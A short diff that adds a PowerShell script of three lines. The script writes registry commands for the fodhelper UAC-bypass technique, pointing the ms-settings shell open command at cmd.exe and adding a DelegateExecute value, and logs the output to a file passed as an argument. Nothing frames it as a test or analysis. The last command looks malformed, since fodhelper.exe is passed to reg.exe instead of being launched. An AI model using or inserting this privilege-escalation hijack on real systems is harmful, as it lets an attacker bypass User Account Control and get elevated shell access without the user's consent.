@@ -1,0 +1,3 @@
+"**********************************************************************************************" | Out-File -FilePath $args[0]
+cmd.exe /c 'reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "cmd.exe" /f' | Out-File -FilePath $args[0] -Append
+cmd.exe /c 'reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f fodhelper.exe' | Out-File -FilePath $args[0] -Append
